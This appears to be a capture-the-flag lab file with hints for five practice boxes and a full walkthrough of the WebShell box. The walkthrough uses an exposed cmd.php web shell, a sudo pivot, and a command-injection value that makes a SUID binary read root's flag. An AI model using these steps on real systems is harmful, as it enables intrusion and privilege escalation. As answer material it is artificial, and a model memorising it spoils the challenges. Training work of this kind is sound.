user.description: Submit the user flag from the WebShell box.

hints.title: Read the HTML comments
hints.content: Start with the front page source. It points at a development helper page that should never have been left exposed.

hints.title: Pivot from the web user
hints.content: The command page runs as `www-data`. Enumerate that account's sudo rights before you start hunting for passwords.

solution.content:
## Box 0 Walkthrough

This walkthrough covers the full `webdev01` box. Replace `<WEBSHELL_IP>` with the private IP of your WebShell target.

### 1. Recon the target
Look for a web service first:

```bash
nmap -Pn -sV --top-ports 100 <WEBSHELL_IP>
```

You should find Apache on port 80.

### 2. Find the exposed helper page
Open the site or pull the HTML and inspect the comments:

```bash
curl http://<WEBSHELL_IP>/
```

The page source points at `/cmd.php`, which executes shell commands on the host.

### 3. Confirm code execution
Use the helper page to verify the context:

```bash
curl "http://<WEBSHELL_IP>/cmd.php?cmd=id"
```

You should see the web server context as `www-data`.

### 4. Pivot to `john` and read the user flag
Check the sudo rights for `www-data`:

```bash
sudo -l
```

`www-data` can run `/bin/bash` as `john` without a password. Use that to switch users and read the flag:

```bash
sudo -u john /bin/bash
cat /home/john/local.txt
```

### 5. Escalate to root
From the `john` shell, enumerate unusual SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

The custom `/usr/local/bin/backup` binary calls `tar` through `system()` without safely handling its argument. Inject a second command to read the root flag directly:

```bash
/usr/local/bin/backup "/tmp; cat /root/root.txt #"
```

If you want a root shell instead, the same bug can be used to launch `bash -p`.

root.description: Submit the root flag from the WebShell box.

hints.title: Look for a custom SUID binary
hints.content: The interesting binary is not one of the standard system utilities. Check `/usr/local/bin` while enumerating SUID files.

hints.title: Unsafe shelling out
hints.content: If a SUID program passes your input straight into `system()` without quoting it, shell metacharacters become a privilege escalation path.

user.description: Submit the user flag from the MailRoom box.

hints.title: Try anonymous access first
hints.content: One service on this host allows you in without credentials and exposes internal onboarding material.

hints.title: Username plus password pattern
hints.content: The leaked onboarding note gives you a default password format. Combine it with the employee directory to find the right service account.

root.description: Submit the root flag from the MailRoom box.

hints.title: Check sudo rights
hints.content: Once you have the service account, `sudo -l` points to the intended escalation path.

hints.title: PATH matters here
hints.content: The allowed backup script calls common tools without a fixed absolute path, and the sudo policy keeps your custom `PATH` in play.

user.description: Submit the user flag from the HelpDesk box.

hints.title: Start with the file share
hints.content: This Windows host exposes a support share that is readable without normal user access. The setup notes are more useful than the portal itself.

hints.title: Use the leaked workstation creds
hints.content: The note includes both the username and password for the temporary HelpDesk account. That is enough to log in over RDP.

root.description: Submit the root flag from the HelpDesk box.

hints.title: Scheduled tasks leave breadcrumbs
hints.content: The leaked deployment material tells you exactly which script runs as `SYSTEM` and how often it executes.

hints.title: You can edit the task's script
hints.content: The `helpdesk` user is not an admin, but it can still modify `C:\Scripts\cleanup.ps1`. Use the next scheduled run to execute your own PowerShell as `SYSTEM`.

user.description: Submit the user flag from the DevBox box.

hints.title: Search is not just search
hints.content: The notes app shells out to the OS when it handles search queries. Treat the query string like an injection surface.

hints.title: The backup directory matters
hints.content: Once you break out as the app user, read around `/opt/backups`. There is enough there to move into the `devops` account and reach the user flag.

root.description: Submit the root flag from the DevBox box.

hints.title: Enumerate sudo again as devops
hints.content: The `devops` account has a very specific passwordless sudo permission. It is enough to turn a scripting runtime into a root shell.

hints.title: GTFOBins applies
hints.content: If `sudo -l` gives you `node`, use the standard Node.js GTFOBins pattern to spawn a privileged shell and read `/root/root.txt`.

user.description: Submit the user flag from the Vault box.

hints.title: Start from DevBox
hints.content: The DevBox application stores Vault credentials in its environment. Use those to authenticate to this host instead of guessing.

hints.title: Use a management protocol
hints.content: The `vaultadmin` account is intended to connect over WinRM. Once you get a shell, the user flag is on the desktop.

root.description: Submit the root flag from the Vault box.

hints.title: Read the desktop note carefully
hints.content: The host tells you which groups `vaultadmin` belongs to. One of them is a built-in privilege escalation path on Windows.

hints.title: Backups leak admin material too
hints.content: The Backups share contains credential artifacts. Between the share contents and Backup Operators rights, you have more than one way to reach the Administrator context.
